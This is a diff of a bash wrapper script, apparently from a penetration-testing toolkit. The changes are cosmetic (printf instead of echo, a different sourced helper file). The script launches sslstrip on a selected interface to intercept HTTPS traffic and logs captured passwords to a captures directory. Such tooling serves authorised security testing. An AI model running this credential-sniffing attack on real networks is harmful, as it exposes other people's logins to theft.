@@ -1,5 +1,6 @@
 #!/bin/bash
 # SSL strip script for sniffing on available interfaces
+clear
 
 trap f_clean_up INT
 trap f_clean_up KILL
@@ -7,13 +8,11 @@ trap f_clean_up KILL
 #this block controls the features for px_interface_selector
 include_cell=1
 require_ip=1
-. /opt/pwnix/pwnpad-scripts/px_interface_selector.sh
+. /opt/pwnix/pwnpad-scripts/px_functions.sh
 
 # Cleanup function to ensure sslstrip stops and iptable rules stop
 f_clean_up(){
-  echo
-  echo "[!] Killing other instances of sslstrip and flushing iptables"
-  echo
+  printf "\n[!] Killing other instances of sslstrip and flushing iptables\n\n"
   killall sslstrip
 
   # Remove SSL Strip iptables rule ONLY
@@ -27,10 +26,7 @@ f_ip_tables(){
 
 f_run(){
   # Path to sslstrip definitions
-  clear
-  echo
-  echo "Logs saved to /opt/pwnix/captures/passwords/"
-  echo
+  printf "\nLogs saved to /opt/pwnix/captures/passwords/\n\n"
   sleep 2
 
   f_interface
@@ -41,8 +37,7 @@ f_run(){
   sslstrip -pfk -w $logfile  -l 8888 $interface &
 
   sleep 3
-  echo
-  echo
+  printf "\n\n"
   tail -f $logfile
 }
 
